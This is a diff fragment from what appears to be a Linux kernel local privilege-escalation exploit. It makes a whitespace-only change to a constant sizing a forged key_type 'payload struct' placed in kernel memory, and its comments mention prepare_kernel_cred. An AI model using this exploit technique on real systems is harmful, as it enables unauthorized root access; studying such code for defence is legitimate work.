@@ -34,7 +34,7 @@ _prepare_kernel_cred prepare_kernel_cred;
  * The first number is the size of struct key_type as defined in kernel source code
  * The second number is the length of the header of the message that will put
  * the payload into kernel space */
-#define STRUCT_LEN (0xb8 - 0x30)
+#define STRUCT_LEN (0xb8 - 0x30) 
 
 /* This is the payload struct: compare it to the real key_type in comments below. 
  * Notice that the last 5 items are removed: This accounts for the 0x30 bytes
